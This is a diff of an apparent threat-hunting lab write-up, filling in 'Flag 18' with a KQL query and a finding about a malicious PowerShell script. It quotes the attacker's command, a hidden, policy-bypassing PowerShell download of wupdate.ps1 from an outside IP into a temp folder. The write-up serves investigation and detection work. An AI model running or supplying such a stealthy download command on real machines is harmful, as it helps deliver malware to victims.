@@ -302,16 +302,20 @@ DeviceEvents
 
 ##  Flag 18 – Identify the PowerShell script file used to automate the attack chain
 
-**Objective**: 
+**Finding**: The attacker downloads a malious file from `http[:]//78[.]141[.]196[.]6[:]8080` under the file name `wupdate.ps1` at `2025-11-19T18:37:40.4082551Z`    
 
-**Finding**:  
+**Command Used**:  `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http[:]//78[.]141[.]196[.]6[:]8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`  
+
 
 **KQL Query**:
 ```
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where FileName has_any (".ps1", ".bat")
+| where InitiatingProcessCommandLine contains "WebRequest"
+| order by Timestamp desc
+
 ```
-
-**Notes:**
-
 ---
 ##  Flag 19 – What IP address was targeted for lateral movement
 
